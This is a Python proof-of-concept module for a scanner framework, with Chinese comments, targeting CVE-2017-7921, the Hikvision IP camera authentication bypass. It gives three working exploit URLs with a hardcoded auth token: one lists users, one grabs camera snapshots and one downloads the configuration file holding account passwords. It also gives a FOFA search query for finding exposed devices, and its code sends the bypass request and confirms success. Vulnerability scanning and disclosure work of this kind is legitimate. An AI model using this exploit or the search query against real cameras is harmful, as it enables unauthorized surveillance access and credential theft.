# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "海康威视 IP摄像头未授权访问（CVE-2017-7921）",                        # 漏洞名称
        "VulnID" : "CVE-2017-7921",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "海康威视 IP摄像头",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            许多HikvisionIP摄像机包含一个后门，允许未经身份验证的模拟任何配置的用户帐户。

            利用路径：/Security/users?auth=YWRtaW46MTEK
            检索所有用户及其角色的列表

            利用路径：/onvif-http/snapshot?auth=YWRtaW46MTEK
            获取相机快照而不进行身份验证

            利用路径：/System/configurationFile?auth=YWRtaW46MTEK
            下载摄像头配置账号密码文件

            第一个利用路径检测成功了第二三个也一定会成功，本POC仅检测第一个利用路径即可
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="HIKVISION-视频监控" && icon_hash="999357577"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/Security/users?auth=YWRtaW46MTEK" # url自己按需调整
        # url1 = self.target + "/onvif-http/snapshot?auth=YWRtaW46MTEK" # url自己按需调整
        # url2 = self.target + "/System/configurationFile?auth=YWRtaW46MTEK" # url自己按需调整
        

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "<userName>" in req.text and "<priority>" in req.text:#req.status_code == 200 and :
                vuln = [True,req.text]
            
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()